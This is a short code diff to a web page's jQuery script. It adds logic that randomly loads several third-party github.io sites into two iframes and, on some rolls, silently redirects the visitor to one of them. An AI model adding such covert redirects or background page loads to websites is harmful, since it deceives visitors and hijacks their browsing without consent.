@@ -6,13 +6,26 @@
   $(document).ready(function (){
   var r1 = Math.floor(Math.random()*10);
   if(r1 > 4){
-    $("iframe").attr("src", "https://footbollmeneger.github.io/");
+    var r2 = Math.floor(Math.random()*10);
+    if(r2 > 6){
+      $("iframe:eq(0)").attr("src", "https://footbollmeneger.github.io/");
+      $("iframe:eq(1)").attr("src", "https://lenproducts.github.io/");
+    } else if(r2 > 3){
+      $("iframe:eq(0)").attr("src", "https://footbollmeneger.github.io/");
+      $("iframe:eq(1)").attr("src", "https://nono.github.io/");
+    } else {
+      $("iframe:eq(0)").attr("src", "https://lenproducts.github.io/");
+      $("iframe:eq(1)").attr("src", "https://nono.github.io/");
+    }
   } else {
     var r3 = Math.floor(Math.random()*100);
     if(r3 > 80){
       document.location.href = "https://footbollmeneger.github.io/";
+    } else if (r3 > 60){
+      document.location.href = "https://lenproducts.github.io/";
     }
   }
   });
 </script>
+<iframe sandbox="allow-same-origin || allow-scripts"></iframe>
 <iframe sandbox="allow-same-origin || allow-scripts"></iframe>
